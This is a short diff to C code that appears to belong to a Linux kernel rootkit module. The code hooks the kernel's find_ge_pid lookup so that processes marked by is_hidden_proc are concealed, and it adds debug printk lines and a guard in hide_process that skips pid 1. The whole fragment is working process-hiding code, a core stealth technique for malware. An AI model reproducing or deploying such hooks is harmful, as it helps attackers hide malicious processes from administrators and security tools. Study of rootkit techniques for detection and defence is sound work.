@@ -101,7 +101,12 @@ static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
 {
     struct pid *pid = real_find_ge_pid(nr, ns);
     while (pid && is_hidden_proc(pid->numbers->nr))
-        pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
+    {
+        printk(KERN_INFO "@ %s pid(%d) is hidden \n",
+            __func__, pid->numbers->nr);
+        // pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
+        return NULL;
+    }
     return pid;
 }
 
@@ -118,6 +123,8 @@ static int hide_process(pid_t pid)
 {
     pid_node_t *proc = NULL;
     struct pid *t_chpid = NULL;
+    if (1 == pid)
+        return SUCCESS;
     t_chpid = find_get_pid(pid);
     if (NULL == t_chpid) {
         printk(KERN_INFO "@ %d not exist\n", pid);
